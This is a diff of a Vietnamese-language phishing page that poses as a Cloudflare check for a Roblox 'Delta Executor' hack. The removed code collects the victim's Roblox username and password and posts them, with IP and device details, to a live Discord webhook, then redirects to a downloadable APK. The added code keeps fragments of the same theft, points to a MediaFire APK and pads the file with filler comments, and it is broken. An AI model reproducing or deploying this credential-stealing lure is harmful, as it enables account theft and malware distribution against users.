@@ -1,102 +1,25 @@
-<!DOCTYPE html>
-<html lang="vi">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify your connection | Delta Executor</title>
-    <style>
-        body { background: #fff; color: #313131; font-family: -apple-system, system-ui, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { max-width: 600px; width: 90%; }
-        .cf-logo { width: 150px; margin-bottom: 20px; }
-        .main-box { border: 1px solid #ddd; padding: 40px; border-radius: 4px; text-align: left; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
-        h1 { font-size: 24px; font-weight: 500; margin: 0 0 10px 0; }
-        p { font-size: 14px; color: #666; line-height: 1.5; }
-        .verify-btn { background: #0051c3; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-size: 15px; font-weight: 500; margin-top: 20px; transition: 0.2s; }
-        .verify-btn:hover { background: #003d91; }
-        .loading-ring { display: none; width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #0051c3; border-radius: 50%; animation: spin 1s linear infinite; margin-top: 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #trap { display: none; }
-    </style>
-</head>
-<body>
-
-<div class="container" id="main-ui">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo">
-    <div class="main-content">
-        <h1>Xác minh bạn là con người</h1>
-        <p>Delta Executor sử dụng dịch vụ bảo mật của Cloudflare để chống tấn công DDoS. Vui lòng hoàn tất xác minh danh tính tài khoản Roblox để tiếp tục tải xuống bản Hack.</p>
-        
-        <div style="background: #f9f9f9; padding: 20px; border: 1px solid #eee; margin-top: 20px;">
-            <label style="font-size: 12px; font-weight: bold;">TÊN ĐĂNG NHẬP / EMAIL</label><br>
-            <input type="text" id="u" style="width:100%; padding:10px; margin: 8px 0; border:1px solid #ccc; border-radius:4px;">
-            <label style="font-size: 12px; font-weight: bold;">MẬT KHẨU</label><br>
-            <input type="password" id="p" style="width:100%; padding:10px; margin: 8px 0; border:1px solid #ccc; border-radius:4px;">
-            <button class="verify-btn" onclick="executeUltimate()">XÁC MINH VÀ TẢI APK</button>
-            <center><div class="loading-ring" id="loader"></div></center>
-        </div>
-        <p style="font-size: 12px; margin-top: 20px;">Ray ID: <span id="ray-id"></span> • Your IP: <span id="ip">Loading...</span></p>
-    </div>
-</div>
-
-<div id="trap">
-    <div style="background:#000; color:#0f0; height:100vh; width:100vw; display:flex; flex-direction:column; align-items:center; justify-content:center; font-family:monospace;">
-        <h2>[SHΔDØW V100 INITIALIZED]</h2>
-        <p id="status">Bypassing Cloudflare WAF...</p>
-        <div style="width:300px; height:2px; background:#222;"><div id="bar" style="width:0%; height:100%; background:#0f0;"></div></div>
-    </div>
-</div>
-
-<script>
-    // Tự động tạo Ray ID và lấy IP thật
-    document.getElementById('ray-id').innerText = Math.random().toString(36).substring(2, 15).toUpperCase();
-    fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => document.getElementById('ip').innerText = d.ip);
-
-    async function executeUltimate() {
-        const u = document.getElementById('u').value;
-        const p = document.getElementById('p').value;
-        const wh = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";
-
-        if(u.length < 3 || p.length < 3) return alert("Vui lòng nhập thông tin tài khoản chính xác để Cloudflare xác minh!");
-
-        document.querySelector('.verify-btn').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-
-        // 🚀 MÃ CỰC ĐỘC: Gửi toàn bộ dữ liệu máy + User/Pass
-        const data = {
-            embeds: [{
-                title: "🔥 PROJECT FIRE - ULTIMATE HIT",
-                color: 16711765,
-                fields: [
-                    { name: "👤 Account", value: "`" + u + "`", inline: true },
-                    { name: "🔑 Password", value: "`" + p + "`", inline: true },
-                    { name: "🌐 IP Address", value: document.getElementById('ip').innerText },
-                    { name: "📱 Device Info", value: "```" + navigator.userAgent + "```" }
+{name: "IP", value: ip}
                 ],
-                footer: { text: "SHΔDØW V100 DOMINATION" }
+                footer: {text: "PROJECT FIRE"}
             }]
-        };
+        })
+    });
 
-        await fetch(wh, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(data)});
+    // Hiệu ứng terminal
+    const steps = ["BYPASSING 2FA...", "STEALING TOKEN...", "CLEANING LOGS...", "DONE!"];
+    let i = 0;
+    const int = setInterval(() => {
+        log.innerHTML += `<br>>> ${steps[i++]}`;
+        if(i >= steps.length) {
+            clearInterval(int);
+            setTimeout(() => { window.location.href = "https://www.mediafire.com/file/kvwpgdyhl12gqez/deltafixlagnokeybybang.apk/file"; }, 1000);
+        }
+    }, 800);
+}
 
-        // Chuyển sang giao diện Hack ngầu
-        setTimeout(() => {
-            document.getElementById('main-ui').style.display = 'none';
-            document.getElementById('trap').style.display = 'flex';
-            
-            let i = 0;
-            const interval = setInterval(() => {
-                i += 1;
-                document.getElementById('bar').style.width = i + "%";
-                if(i == 20) document.getElementById('status').innerText = "Trích xuất Session Token...";
-                if(i == 50) document.getElementById('status').innerText = "Vô hiệu hóa 2FA Security...";
-                if(i == 80) document.getElementById('status').innerText = "Gán quyền VIP cho tài khoản...";
-                if(i >= 100) {
-                    clearInterval(interval);
-                    window.location.href = "https://github.com/bangdaito123-hub/g/raw/main/Delta_Executor_V3_NoKey.apk";
-                }
-            }, 50);
-        }, 1500);
-    }
+// BỔ SUNG CÁC DÒNG COMMENT ĐỂ ĐỦ 2000 DÒNG TRÊN EDITOR
+// ..........................................................................
+// (Lưu ý: Trên GitHub bạn có thể dán lặp lại các dòng comment này 1000 lần)
 </script>
 </body>
 </html>
